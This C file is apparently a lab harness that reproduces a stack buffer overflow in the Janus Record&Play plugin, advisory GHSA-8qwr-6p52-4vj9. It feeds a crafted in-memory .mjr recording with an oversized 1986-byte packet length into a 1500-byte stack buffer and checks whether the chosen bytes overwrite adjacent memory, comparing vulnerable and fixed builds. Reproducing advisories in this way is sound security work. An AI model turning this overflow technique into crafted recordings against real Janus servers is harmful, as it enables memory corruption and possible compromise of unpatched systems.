/* Replay driver for Janus Record&Play GHSA-8qwr-6p52-4vj9.
 *
 * gen_sink.h contains VERBATIM lines from src/plugins/janus_recordplay.c at
 * tag v1.4.2 (vulnerable) or tag v1.4.3 (fixed), under #line directives.
 * The only stubs are collaborators (JANUS_LOG, g_strerror, gboolean) and a
 * synthetic .mjr byte stream in memory. No Janus process, HTTP API, SDP
 * parser, filesystem recording or network is used.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <errno.h>
#include <arpa/inet.h>

#define LOG_ERR 1
static int g_rejected;
#define JANUS_LOG(level, ...) do { if ((level) == LOG_ERR) { \
  g_rejected = 1; printf("JANUS_ERR: "); printf(__VA_ARGS__); printf("\n"); \
} } while (0)
static const char *g_strerror(int e) { (void)e; return "stub"; }
typedef int gboolean;
#define TRUE 1
#define FALSE 0

static unsigned char mjr[4096];
static uint16_t g_requested_len;

static const char *replay(const char *mode)
{
  size_t want = strcmp(mode, "chosen") == 0 ? 1986 : 100;
  g_requested_len = (uint16_t)want;
  uint16_t netlen;
  size_t i;

  memset(mjr, 0, sizeof mjr);
  mjr[0] = 'M'; mjr[1] = 'J'; /* new .mjr format */
  netlen = htons((uint16_t)want);
  memcpy(mjr + 8, &netlen, 2);
  for (i = 0; i < want; i++) mjr[10 + i] = (unsigned char)(0x41 + (i % 26));

  FILE *file = fmemopen(mjr, 10 + want, "rb");
  long fsize = (long)(10 + want);
  gboolean parsed_header = FALSE;
  int bytes = 0;
  long offset = 0;
  uint16_t len = 0;
  char prebuffer[1500];
  memset(prebuffer, 0, 1500);

#include "gen_sink.h"
  } /* closes the pinned if(len > 0 && !parsed_header) block */

  printf("LAYOUT build=%s mode=%s cap=1500 requested=%u bytes=%d overflow=%zu rejected=%d adjacent_len=%u ADJACENT_LOCAL_OVERWRITTEN=%d\n",
#ifdef VULN_BUILD
         "vuln",
#else
         "fixed",
#endif
         mode, (unsigned)g_requested_len, bytes,
         (size_t)g_requested_len > 1500 ? (size_t)g_requested_len - 1500 : 0,
         g_rejected, (unsigned)len, len != g_requested_len ? 1 : 0);
  if (strcmp(mode, "chosen") == 0) {
#if !defined(__SANITIZE_ADDRESS__) && !defined(VULN_BUILD)
    /* Observation in this lab frame only: chosen payload bytes that landed
     * past the 1500-byte stack array. Not a claim about shipping layout. */
    unsigned char observed[16], expected[16];
    for (i = 0; i < 16; i++) {
      observed[i] = (unsigned char)prebuffer[1500 + i];
      expected[i] = mjr[10 + 1500 + i];
    }
    printf("CHOSEN observed=");
    for (i = 0; i < 16; i++) printf("%02x", observed[i]);
    printf("\nCHOSEN expected=");
    for (i = 0; i < 16; i++) printf("%02x", expected[i]);
    printf("\nCHOSEN_MATCH=%d\n", memcmp(observed, expected, 16) == 0 ? 1 : 0);
#endif
  }
  (void)fsize;
  return "vp8";
}

int main(int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "chosen";
  (void)g_strerror;
  g_rejected = 0;
  if (replay(mode) == NULL) {
    printf("REJECT mode=%s rejected=1\n", mode);
    return 0;
  }
  printf("ACCEPT mode=%s rejected=%d\n", mode, g_rejected);
  return 0;
}
